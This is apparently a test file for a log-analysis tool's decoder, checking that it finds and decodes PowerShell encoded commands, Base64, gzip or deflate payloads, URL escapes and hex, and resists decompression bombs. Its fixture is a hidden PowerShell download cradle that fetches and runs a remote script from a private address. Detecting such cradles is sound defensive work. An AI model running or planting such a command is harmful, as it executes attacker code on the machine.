import { deflateRawSync, gzipSync } from 'node:zlib';
import { describe, expect, it } from 'vitest';
import { DECODED_PARTS, decodings, encodedParts, SCANNED_LIMIT } from '../src/explore/decode';

const base64 = (text: string, encoding: BufferEncoding = 'utf8') => Buffer.from(text, encoding).toString('base64');
const SCRIPT = 'IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")';

describe('encoded parts of a value', () => {
  it.each([
    ['powershell.exe -nop -w hidden -enc ' + base64(SCRIPT, 'utf16le'), 'powershell'],
    ['powershell -EncodedCommand ' + base64(SCRIPT, 'utf16le'), 'powershell'],
    ['powershell /ec ' + base64(SCRIPT, 'utf16le'), 'powershell'],
    ['echo ' + base64('hello world from zircolite, once more'), 'base64'],
    ['http://x/run?q=a%20b%3Fc%26d', 'url'],
    ['payload 48656c6c6f20576f726c642121212121', 'hex'],
  ])('finds %j as %s', (value, kind) => {
    expect(encodedParts(value).map((part) => part.kind)).toContain(kind);
  });

  it.each(['C:\\Program Files\\WindowsApps\\Microsoft.WindowsCalculator', 'powershell -nop -w hidden', 'ProgramFilesX86', '100% done', ''])(
    'finds nothing in %j',
    (value) => {
      expect(encodedParts(value)).toEqual([]);
    },
  );
});

describe('decoding', () => {
  it('reads a PowerShell encoded command as UTF-16LE', async () => {
    const [first] = await decodings('powershell.exe -nop -w hidden -enc ' + base64(SCRIPT, 'utf16le'));
    expect(first).toMatchObject({ label: 'PowerShell -EncodedCommand', text: SCRIPT });
  });

  it('reads Base64 as UTF-8 or UTF-16LE text, whichever it is', async () => {
    expect((await decodings(base64('hello world from zircolite, once more')))[0].text).toBe('hello world from zircolite, once more');
    expect((await decodings(base64(SCRIPT, 'utf16le')))[0].text).toBe(SCRIPT);
  });

  it('unpacks gzip and raw deflate payloads, as PowerShell droppers pack them', async () => {
    const gzipped = gzipSync(Buffer.from(SCRIPT)).toString('base64');
    expect((await decodings(`[Convert]::FromBase64String('${gzipped}')`))[0]).toMatchObject({ label: 'Base64, gzip', text: SCRIPT });
    const deflated = deflateRawSync(Buffer.from(SCRIPT)).toString('base64');
    expect((await decodings(`FromBase64String("${deflated}")`))[0]).toMatchObject({ label: 'Base64, deflate', text: SCRIPT });
  });

  it('decodes URL escapes and hex text', async () => {
    expect((await decodings('http://x/run?q=a%20b%3Fc%26d'))[0].text).toBe('http://x/run?q=a b?c&d');
    expect((await decodings('48656c6c6f20576f726c642121212121'))[0].text).toBe('Hello World!!!!!');
  });

  it('offers nothing for bytes that are not text', async () => {
    const random = Buffer.from(Array.from({ length: 48 }, (_, i) => (i * 97 + 13) % 256)).toString('base64');
    expect(await decodings(random)).toEqual([]);
  });

  it('keeps a long decoding to its first 64 KiB, and says so', async () => {
    const long = 'A'.repeat(80_000);
    const [first] = await decodings(base64(long));
    expect(first.text).toHaveLength(65_536);
    expect(first.truncated).toBe(true);
  });

  it('decodes each part once, in order', async () => {
    const one = base64('first message, long enough to count');
    const two = base64('second message, long enough to count');
    expect((await decodings(`${one} and ${two} and ${one}`)).map((d) => d.text)).toEqual([
      'first message, long enough to count', 'second message, long enough to count',
    ]);
  });
});

describe('a value crafted to exhaust the page', () => {
  it('decodes at most a handful of parts', async () => {
    const parts = Array.from({ length: 40 }, (_, i) => base64(`message number ${i} long enough to be base64`)).join(' ');
    expect((await decodings(parts)).length).toBe(DECODED_PARTS);
  });

  it('stops unpacking once the value has unpacked a few MiB in all', async () => {
    const bombs = Array.from({ length: 10 }, (_, i) => gzipSync(Buffer.from(`${i}`.padEnd(1024 * 1024, 'A'))).toString('base64')).join(' ');
    expect((await decodings(bombs)).length).toBeLessThanOrEqual(4);
  });

  it('looks for encoded parts only near the start of a huge value', () => {
    const tail = base64('found only past the scanned part of the value');
    expect(encodedParts(`${'x '.repeat(SCANNED_LIMIT)}${tail}`)).toEqual([]);
  });
});
